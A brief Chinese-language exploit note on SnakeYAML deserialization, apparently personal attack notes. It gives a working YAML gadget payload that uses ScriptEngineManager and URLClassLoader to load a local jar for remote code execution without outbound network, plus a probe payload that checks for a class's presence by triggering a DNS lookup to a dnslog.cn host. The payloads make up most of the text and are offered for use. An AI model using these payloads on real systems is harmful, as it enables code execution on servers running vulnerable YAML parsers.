# snakeyaml

## 不出网利用
>通过写文件然后本地加载rce

//todo 写一个工具 去完成


https://xz.aliyun.com/t/10655

加载本地
```java
String data2 = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"file:E:/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
```

## 判断类存在
```java
 String poc = "[!!判断的类全类名 []: 0, !!java.net.URL [null, \"http://ixvoxg.dnslog.cn\"]: 1]";
```
